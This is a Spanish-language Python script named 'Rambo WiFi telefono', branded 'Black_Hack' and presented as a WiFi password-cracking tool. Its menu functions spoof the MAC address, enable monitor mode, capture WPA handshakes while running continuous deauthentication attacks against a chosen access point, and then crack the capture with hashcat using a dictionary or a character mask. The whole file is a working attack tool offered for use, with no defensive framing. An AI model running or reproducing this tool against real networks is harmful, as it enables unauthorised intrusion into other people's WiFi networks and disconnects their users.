#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading
from io import open
## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa Rambo WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en craking rainbow
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("		 Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["Opciones:","1) Scaner red ", "2) Capture", "3) Crack", "4) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
	print(listamenu[4])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def scan():
	global bssid
	global canal
	global diccionario
	global caracter
	global dic
	time_scan=input("Seleccione tiempo de escaneo default 60 : ")
	if(time_scan==''):
		time_scan="60"
	os.system('nmcli -w '+time_scan+' device wifi list')
	bssid=input("seleccione BSSID : ")
	canal=input("seleccione CHANEL : ")
	dic=input("Desea seleccionar diccionario? y o n :")
	if(dic=='y'):
		diccionario=input("Introduzca ruta diccionario: ")
		caracter=1
	else:
		caracter=input("Introduzca caracteres:")
		diccionario=1
	return bssid, canal, diccionario, dic, caracter

def attack(bssid,canal):
	os.system("ifconfig")
	wlan=input("Introduzca Wlan: ")
	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
		wlan=wlan
	else:
		print("Procesando")
		os.system('ifconfig '+wlan+' down')
		time.sleep(1)
		os.system('macchanger -A '+wlan)
		time.sleep(1)
		os.system('ifconfig '+wlan+' up') 
		time.sleep(1)
		os.system('airmon-ng check kill')
		time.sleep(1)
		os.system('airmon-ng start '+wlan)
		time.sleep(1)
		os.system('airmon-ng check '+wlan)
		time.sleep(1)
		wlan=(wlan+"mon")
	print(wlan)
	os.system('x-terminal-emulator -e airodump-ng -c '+canal+' -w file --bssid '+bssid+' '+wlan)
	os.system('x-terminal-emulator -e aireplay-ng -0 0 -a'+bssid+' '+wlan+' --ignore-negative-one')

def crack(diccionario,dic,caracter):
	os.system('./cap2hccapx.bin /root/Especial_termux_kali/file-01.cap /root/Especial_termux_kali/file-01.hccapx')
	if(dic=='y'):
		os.system('x-terminal-emulator -e hashcat -m 2500 /root/Especial_termux_kali/file-01.hccapx '+ diccionario)
	else:
		os.system('x-terminal-emulator -e hashcat -m 2500 -a3 /root/Especial_termux_kali/file-01.hccapx '+caracter)
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		scan()
	elif (key==2):
		attack(bssid,canal)
	elif (key==3):
		crack(diccionario,dic,caracter)
	elif (key==4):
		os.system('airmon-ng stop wlan0mon')
		os.system('ifconfig wlan0 down')
		os.system('iwconfig wlan0 mode managed')
		os.system('ifconfig wlan0 up')
		os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
